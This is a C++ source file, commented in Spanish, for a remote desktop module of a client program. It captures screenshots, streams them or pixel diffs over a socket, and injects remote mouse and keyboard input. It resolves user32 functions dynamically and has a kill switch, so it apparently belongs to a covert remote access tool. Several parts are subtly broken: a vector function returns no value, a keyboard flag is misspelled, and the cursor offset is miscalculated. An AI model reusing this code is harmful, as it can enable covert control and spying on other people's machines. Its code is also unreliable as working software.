#include "cliente.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

extern Cliente* cCliente;
mod_RemoteDesktop* mod_Instance = nullptr;

std::vector<Monitor> tmp_Monitores;

void Print_Mouse_Command(int x, int y, int monitor_index, int mouse_action) {
    std::cout << "X: " << x << "\nY:" << y << "Monitor: " << monitor_index << "\nAction: " << mouse_action << "\n";
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

bool mod_RemoteDesktop::m_isRunning() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    return this->isRunning;
}

void mod_RemoteDesktop::m_UpdateVmouse(bool isVisible) {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->isMouseOn = isVisible;
}

bool mod_RemoteDesktop::m_Vmouse() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->isMouseOn;
}

void mod_RemoteDesktop::m_RemoteMouse(int x, int y, int monitor_index, int mouse_action) {
    if(!this->USER32.pSendInput){
        __DBG_("[user32.dll] SendInput no cargado");
        return;
    }
    Print_Mouse_Command(x, y, monitor_index, mouse_action);
    Monitor monitor = this->m_GetMonitor(monitor_index);
    if (monitor.rectData.resWidth > 0) {
        SetCursorPos(x, y);
        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        DWORD dwFlag = 0; //MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE;
        switch (mouse_action) {
            case EnumRemoteMouse::_LEFT_DOWN:
                dwFlag = MOUSEEVENTF_LEFTDOWN;
                break;
            case EnumRemoteMouse::_LEFT_UP:
                dwFlag = MOUSEEVENTF_LEFTUP;
                break;
            case EnumRemoteMouse::_RIGHT_DOWN:
                dwFlag = MOUSEEVENTF_RIGHTDOWN;
                break;
            case EnumRemoteMouse::_RIGHT_UP:
                dwFlag = MOUSEEVENTF_RIGHTUP;
                break;
            case EnumRemoteMouse::_MIDDLE_DOWN:
                dwFlag = MOUSEEVENTF_MIDDLEDOWN;
                break;
            case EnumRemoteMouse::_MIDDLE_UP:
                dwFlag = MOUSEEVENTF_MIDDLEUP;
                break;
            case EnumRemoteMouse::_WHEEL_DOWN:
            case EnumRemoteMouse::_WHEEL_UP:
                dwFlag = MOUSEEVENTF_WHEEL;
                break;
            default:
                break;
        }

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dwFlags = dwFlag;
        if (mouse_action == EnumRemoteMouse::_WHEEL_DOWN) {
            inputs[0].mi.mouseData = -120;
        }else if (mouse_action == EnumRemoteMouse::_WHEEL_UP) {
            inputs[0].mi.mouseData = 120;
        }
        this->USER32.pSendInput(1, inputs, sizeof(INPUT));
        /*
         
        Metodo 2
        int normalized_x = ((x - monitor.rectData.xStart) * 65535) / monitor.rectData.resWidth;
        int normalized_y = ((y - monitor.rectData.yStart) * 65535) / monitor.rectData.resHeight;

        INPUT inputs[1] = {};
        ZeroMemory(inputs, sizeof(inputs));

        inputs[0].type = INPUT_MOUSE;
        inputs[0].mi.dx = normalized_x;
        inputs[0].mi.dy = normalized_y;
        inputs[0].mi.dwFlags = MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
        */
        //UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
        //if (uSent != ARRAYSIZE(inputs)) {
        //   _DBG_("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
        //}
        
    }else {
        _DBG_("[X] El monitor seleccionado no existe", monitor_index);
    }
}

void mod_RemoteDesktop::m_RemoteTeclado(char key, bool isDown) {
    if (!this->USER32.pSendInput) {
        __DBG_("[user32.dll] SendInput no cargado");
        return;
    }
    INPUT inputs[1] = {};
    ZeroMemory(inputs, sizeof(inputs));

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = key;
    inputs[0].ki.dwFlags = isDown ? KEYEVENTF_KEDOWN : KEYEVENTF_KEYUP;
    
    this->USER32.pSendInput(1, inputs, sizeof(INPUT));
}

int mod_RemoteDesktop::BitmapDiff(std::shared_ptr<Gdiplus::Bitmap>& _oldBitmap, std::shared_ptr<Gdiplus::Bitmap>& _newBitmap, std::vector<Pixel_Data>& _outPixels) {
    if (_newBitmap.get() == nullptr || _oldBitmap.get() == nullptr) {
        __DBG_("Uno de los bitmaps es nulo");
        return -1;
    }

    UINT width = _oldBitmap.get()->GetWidth();
    UINT height = _oldBitmap.get()->GetHeight();

    if (width != _newBitmap.get()->GetWidth() || height != _newBitmap.get()->GetHeight()) {
        __DBG_("Los bitmaps no son del mismo tamanio");
        return -1;
    }

    Gdiplus::BitmapData bmpData1, bmpData2;
    Gdiplus::Rect rect(0, 0, width, height);

    _oldBitmap.get()->LockBits(&rect, Gdiplus::ImageLockMode::ImageLockModeRead | Gdiplus::ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData1);
    _newBitmap.get()->LockBits(&rect, Gdiplus::ImageLockMode::ImageLockModeRead | Gdiplus::ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData2);

    BYTE* oldBitmapPixels = static_cast<BYTE*>(bmpData1.Scan0);
    BYTE* newBitmapPixels = static_cast<BYTE*>(bmpData2.Scan0);

    int outCantidad = 0;

    for (UINT y = 0; y < height; y++) {
        for (UINT x = 0; x < width; x++) {
            UINT index = y * bmpData1.Stride + x * 3; //3 bytes por pixel en formato RGB
            if (oldBitmapPixels[index    ] != newBitmapPixels[index    ] || //Canal Red
                oldBitmapPixels[index + 1] != newBitmapPixels[index + 1] || //Canal Green
                oldBitmapPixels[index + 2] != newBitmapPixels[index + 2]) { //Canal Blue
                
                //Pixel diferente
                outCantidad++;
                Pixel_Data nPixel;
                nPixel.x = x;
                nPixel.y = y;
                nPixel.data.R = newBitmapPixels[index    ];
                nPixel.data.G = newBitmapPixels[index + 1];
                nPixel.data.B = newBitmapPixels[index + 2];
                _outPixels.push_back(nPixel);

                oldBitmapPixels[index    ] = newBitmapPixels[index    ];
                oldBitmapPixels[index + 1] = newBitmapPixels[index + 1];
                oldBitmapPixels[index + 2] = newBitmapPixels[index + 2];

            }
        }
    }

    _oldBitmap.get()->UnlockBits(&bmpData1);
    _newBitmap.get()->UnlockBits(&bmpData2);

    return outCantidad;
}

void mod_RemoteDesktop::InitGDI() {
    if (Gdiplus::GdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
        this->isGDIon = true;
    }
}

void mod_RemoteDesktop::StopGDI() {
    Gdiplus::GdiplusShutdown(this->gdiplusToken);
}

ULONG mod_RemoteDesktop::m_Quality() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->uQuality;
}

void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
    //32 default
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->uQuality = iNew == 0 ? 32 : static_cast<ULONG>(iNew);
}

mod_RemoteDesktop::mod_RemoteDesktop(HMODULE _user32DLL) {
    this->hUser32DLL = _user32DLL;

    if (this->hUser32DLL) {
        this->USER32.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
        this->USER32.pGetDC = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
        this->USER32.pGetDesktopWindow = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
        this->USER32.pEnumDisplayMonitors = (st_User32_RD::LPENUMDISPLAYMONITORS)wrapGetProcAddr(this->hUser32DLL, "EnumDisplayMonitors");
        this->USER32.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
    }

    this->InitGDI();
    
    mod_Instance = this;

    return;
}

mod_RemoteDesktop::~mod_RemoteDesktop() {
    this->StopGDI();
    return;
}

std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
    std::shared_ptr<Gdiplus::Bitmap> outBitmap = nullptr;

    Monitor monitor = this->m_GetMonitor(index);
    if (monitor.rectData.resHeight == 0) {
        __DBG_("[X] El monitor no es valido o no se ha obtenido al lista");
        return outBitmap;
    }
    
    if (!this->isGDIon) {
        __DBG_("GDI no esta inicializado, init...");
        this->InitGDI();
        if (!this->isGDIon) {
            __DBG_("[X] No se pudo iniciar...");
            return outBitmap;
        }
    }
    
    if (!this->USER32.pGetDC || !this->USER32.pGetDesktopWindow) {
        return outBitmap;
    }

    HDC hdcMonitor = this->USER32.pGetDC(NULL);
    HDC hdcMemDC = NULL;
    HWND hDesktopWnd = this->USER32.pGetDesktopWindow();
    HBITMAP hmpScreen = NULL;

    Gdiplus::Bitmap* pScreenShot = nullptr;
    IStream* oStream = nullptr;
    HRESULT hr = S_OK;
    
    //Cursor
    CURSORINFO cursor = { sizeof(cursor) };
    ICONINFO info = { sizeof(info) };
    RECT cursorRect;
    int cursorX = 0;
    int cursorY = 0;
    BITMAP bmpCursor = { 0 };
    

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        goto EndSec;
    }

    if (!hdcMonitor) {
        __DBG_("GetDC failed\n");
        goto EndSec;
    }

    hdcMemDC = CreateCompatibleDC(hdcMonitor);
    if (!hdcMemDC) {
        __DBG_("GetcomtabielDC failed\n");
        goto EndSec;
    }

    hmpScreen = CreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
    if (!hmpScreen) {
        __DBG_("Createcompatiblebitmap failed\n");
        goto EndSec;
    }
    if (!SelectObject(hdcMemDC, hmpScreen)) {
        __DBG_("select object failed\n");
        goto EndSec;
    }
    if (!BitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
        __DBG_("bitblt failed\n");
        goto EndSec;
    }

    //Si esta habilitado mostrar el mouse
    if (this->m_Vmouse()) {
        GetCursorInfo(&cursor);
        if (cursor.flags == CURSOR_SHOWING) {
            GetWindowRect(hDesktopWnd, &cursorRect);
            GetIconInfo(cursor.hCursor, &info);
            cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
            cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
            GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
            DrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
        }
    }

    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        __DBG_("CreateStreamOnHGlobal error\n");
        goto EndSec;
    }

    CLSID imageCLSID;
    
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    
    pScreenShot = new Gdiplus::Bitmap(hmpScreen, (HPALETTE)NULL);

    if (!pScreenShot) {
        __DBG_("No se pudo reservar memoria para crear el bitmap");
        goto EndSec;
    }

    if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
        __DBG_("No se pudo guardar el buffer al stream");
        goto EndSec;
    }

    oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    outBitmap = std::make_shared<Gdiplus::Bitmap>(oStream);

EndSec:
    if (oStream) {
        oStream->Release();
    }

    if (pScreenShot) {
        delete pScreenShot;
        pScreenShot = nullptr;
    }

    if (hdcMonitor) {
        ReleaseDC(NULL, hdcMonitor);
    }

    if (hdcMemDC) {
        DeleteDC(hdcMemDC);
    }

    if (hmpScreen) {
        DeleteObject(hmpScreen);
    }

    return outBitmap;

}

std::vector<char> mod_RemoteDesktop::getBitmapBytes(std::shared_ptr<Gdiplus::Bitmap>& _in, ULONG _quality) {
    std::vector<char> vcOut;

    IStream* oStream = nullptr;
    HRESULT hr = S_OK;
    STATSTG statstg;

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        goto EndSec;
    }

    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        __DBG_("CreateStreamOnHGlobal error\n");
        goto EndSec;
    }

    // if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
     ///   DebugPrint("No se pudo guardar el buffer al stream");
      //  goto EndSec;
    //}
    CLSID imageCLSID;

    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &_quality;

    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    _in.get()->Save(oStream, &imageCLSID, &encoderParams);

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr == S_OK) {
        ULONG bytes_read = 0;
        unsigned long long int uiBuffsize = statstg.cbSize.LowPart;
        vcOut.resize(uiBuffsize);
        if (vcOut.size() == uiBuffsize) {
            oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
            hr = oStream->Read(vcOut.data(), uiBuffsize, &bytes_read);
        }
    }

EndSec:
    if (oStream != nullptr) {
        oStream->Release();
    }
    return vcOut;
}

void mod_RemoteDesktop::pixelSerialize(const std::vector<Pixel_Data>& _vcin, std::vector<char>& _vcout) {
    int nsize = sizeof(Pixel_Data) * _vcin.size();
    _vcout.resize(nsize);
    if (_vcout.size() == nsize) {
        int iPos = 0;
        for (const Pixel_Data& pixel : _vcin) {
            memcpy(_vcout.data() + iPos, &pixel, sizeof(Pixel_Data));
            iPos += sizeof(Pixel_Data);
        }
    }else {
        __DBG_("No se pudo alojar memoria para el buffer de salida");
    }
}

void mod_RemoteDesktop::SpawnThread(int quality, int monitor_index) {
    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality, monitor_index);
}

void mod_RemoteDesktop::DetenerLive() {
    __DBG_("[RD] Apagando...");
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    this->isRunning = false;
    lock.unlock();
    __DBG_("[RD] Joining thread...");
    if (this->th_RemoteDesktop.joinable()) {
        this->th_RemoteDesktop.join();
    }
    __DBG_("[RD] Done omar :v");
}

void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
    this->isRunning = true;
    this->m_UpdateQuality(quality);
    std::shared_ptr<Gdiplus::Bitmap> oldBitmap = nullptr;
    while (this->m_isRunning()) {
        //Confirmar kill switch
        if (cCliente->isKillSwitch()) {
            __DBG_("[RD] kill_switch...");
            cCliente->setKillSwitch(false);
            this->DetenerLive();
            break;
        }

        std::shared_ptr<Gdiplus::Bitmap> newBitmap = this->getFrameBitmap(this->m_Quality(), monitor_index);

        std::vector<Pixel_Data> vcPixels;
        int iDiff = this->BitmapDiff(oldBitmap, newBitmap, vcPixels);

        if (iDiff == -1) {
            //Hubo un error o uno de los buffers es nulo
            if (newBitmap.get() != nullptr) {
                __DBG_("Asignando newBitmap a oldBitmap");
                Gdiplus::Rect rect(0, 0, newBitmap.get()->GetWidth(), newBitmap.get()->GetHeight());
                Gdiplus::Bitmap* temp_bitmap = newBitmap.get()->Clone(rect, newBitmap.get()->GetPixelFormat());
                oldBitmap = std::shared_ptr<Gdiplus::Bitmap>(temp_bitmap);
                //Obtener bytes del newBitmap
                std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, quality);
                int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
                if (iSent == -1) {
                    break;
                }
            }else {
                __DBG_("newBitmap es nulo");
            }
        }else if (iDiff > 0) {
            //Hubo un cambio, enviar diferencia
            //oldBitmap aqui ya tiene los pixeles modificados
            //Vale la pena enviar el cambio de pixeles?
            if ((sizeof(Pixel_Data) * iDiff) < 80000) {
                //Serializar el vector a un std::vector<char> y mandarlo
                std::vector<char> vcData;
                this->pixelSerialize(vcPixels, vcData);
                int iSent = cCliente->cChunkSend(cCliente->sckSocket, vcData.data(), vcData.size(), 0, true, nullptr, EnumComandos::RD_Salida_Pixel);
                if (iSent == -1) {
                    break;
                }
            }else {
                //Obtener bytes de newbitmap/oldbitmap y mandarlo completo
                std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, quality);
                int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
                if (iSent == -1) {
                    break;
                }
            }
        }else {
            //No hubo cambios
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
}

std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
    this->m_Clear_Monitores();

    if (!this->USER32.pEnumDisplayMonitors) {
        __DBG_("[user32.dll] EnumDisplayMonitors no cargado");
        return;
    }
    
    this->USER32.pEnumDisplayMonitors(NULL, NULL, this->MonitorEnumProc, 0);
    
    for (Monitor monitor : tmp_Monitores) {
        this->m_Agregar_Monitor(monitor);
    }
    tmp_Monitores.clear();

    return this->m_GetVectorCopy();
}

BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT rectMonitor, LPARAM lparam) {
    if (!mod_Instance->USER32.pGetMonitorInfoA) {
        return FALSE;
    }
    MONITORINFOEX info;
    Monitor new_Monitor;
    info.cbSize = sizeof(MONITORINFOEX);
    int width = rectMonitor->right - rectMonitor->left;
    int height = rectMonitor->bottom - rectMonitor->top;
    new_Monitor.rectData.resWidth = width;
    new_Monitor.rectData.resHeight = height;
    new_Monitor.rectData.xStart = rectMonitor->left;
    new_Monitor.rectData.yStart = rectMonitor->top;
    ZeroMemory(new_Monitor.szDevice, sizeof(new_Monitor.szDevice));
    if (mod_Instance->USER32.pGetMonitorInfoA(hMonitor, &info)) {
        memcpy(new_Monitor.szDevice, info.szDevice, sizeof(new_Monitor.szDevice) - 1);
    }
    tmp_Monitores.push_back(new_Monitor);

    return TRUE;
}

void mod_RemoteDesktop::m_Agregar_Monitor(Monitor& new_monitor) {
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.push_back(new_monitor);
}

void mod_RemoteDesktop::m_Clear_Monitores(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    this->vc_Monitores.clear();
}

Monitor mod_RemoteDesktop::m_GetMonitor(int index){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    if (index < this->vc_Monitores.size()) {
        return this->vc_Monitores[index];
    }
    Monitor dummy;
    return dummy;
}

std::vector<Monitor> mod_RemoteDesktop::m_GetVectorCopy(){
    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
    return this->vc_Monitores;
}